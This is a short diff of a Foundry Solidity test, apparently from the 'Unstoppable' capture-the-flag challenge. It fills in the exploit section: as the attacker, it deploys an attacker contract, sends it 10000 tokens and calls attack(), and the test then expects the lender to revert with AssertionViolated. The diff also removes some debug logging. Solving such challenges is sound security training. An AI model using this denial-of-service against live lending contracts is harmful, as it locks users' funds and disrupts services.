@@ -61,21 +61,14 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
-        /**
-         * EXPLOIT END *
-         */
         vm.startPrank(attacker);
         UnstoppableAttacker unstoppableAttacker = new UnstoppableAttacker(address(unstoppableLender));
         dvt.transfer(address(unstoppableAttacker), 10000);
-
-//        console.log("TOKENS_IN_POOL is:", TOKENS_IN_POOL);
-//        console.log("pool balance is:", unstoppableLender.poolBalance());
-//        console.log("address balance is:", dvt.balanceOf(attacker));
-//        console.log("attacker balance is:", dvt.balanceOf(address(unstoppableAttacker)));
-
         unstoppableAttacker.attack();
-
         vm.stopPrank();
+        /**
+         * EXPLOIT END *
+         */
 
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
